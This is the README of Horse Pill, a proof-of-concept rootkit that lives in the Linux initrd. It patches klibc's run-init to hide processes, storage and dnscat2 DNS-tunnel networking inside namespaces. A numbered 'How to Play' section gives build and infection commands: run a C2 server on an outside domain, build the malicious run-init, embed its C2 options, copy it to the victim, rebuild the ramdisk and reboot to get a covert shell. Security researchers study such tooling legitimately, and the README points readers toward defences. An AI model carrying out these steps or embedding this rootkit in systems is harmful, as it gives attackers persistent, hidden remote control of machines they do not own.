# HORSE PILL
Horse Pill is a PoC of a ramdisk based containerizing root kit.  It resides inside the initrd, and prior to the actual init running, it puts it into a mount and pid namespace that allows it to run covert processes and covert storage.  This also allows it run covert networking systems, such as dns tunnels.

# The Moving Parts
There are essentially 3 moving parts here.

## klibc-horsepill.patch
This is patch to klibc, which provides run-init, which on modern Ubuntu systems runs the real init, systemd.  This patches in the rootkit functionality, making a malicious run-init.  This binary has a new section called DNSCMDLINE, which provides the command line options to dnscat, which is bundled within the patch.

## horsepill_setopt
This script takes in command-line arguments and puts them into the section referred to above.

## horsepill_infect
This will takes the file to splat over run-init while assembling ramdisks as a command line argument.  It then calls update-initramfs and splats over the run-init as the ramdisks is being assembled.

# How to Play
1. Set up your dns records for the command and control box as directed by the dnscat2 documentation
1. Get a server on the internet and run the dnscat server on it
    ```
    ruby dnscat.rb --secret=<secret> some.domain.name
    ```
3.  Grab the source for klibc on your attack system.  If apt complains that you don't have source repositories, fix it
    ```
    sudo apt-get build-dep klibc && apt-get source klibc
    ```
4.  build
    ```
    cd klibc-2.xx && quilt import klibc-horsepill.patch && dpkg-buildpackage -j$(nproc) -us -uc
    ```
5. Take that binary and set your options
    ```
    horsepill_setopt path/to/klibc/source/package/usr/kinit/shared/run-init dsncat --secret=<secret> some.domain.name
    ```
6. Copy malicious run-init to victim and horsepill_infect and run
    ```
  horsepill_infect run-init
    ```
7. Reboot victim
8. ???
9. Enjoy your shell
10. Disable on victim by adding "horsepill=0" to kernel command line at boot

# Contributing
Pull requests reviewed and accepted.  Rather than contributing directly to this project, why not contribute to distros and stop them from assembling ramdisks on most systems.  Or contribute to systemd to detect this as a type of containment.  Or perhaps to chrootkit.

# Authors
This was developed by Michael Leibowitz (@r00tkillah)

# License
All parts are licensed BSD.  Klibc is actually dual licensed depending on the part of klibc, but the usr components are BSD licensed.  dnscat2 is also BSD licensed.  Both components have their licenses here as well as klibc-usr-LICENSE.md and danscat2-LICENSE.md.  The combination is covered under the LICENSE.md

# Acknowledgments
Thanks Ron Bowes, the developer of dnscat2 for his fine tool.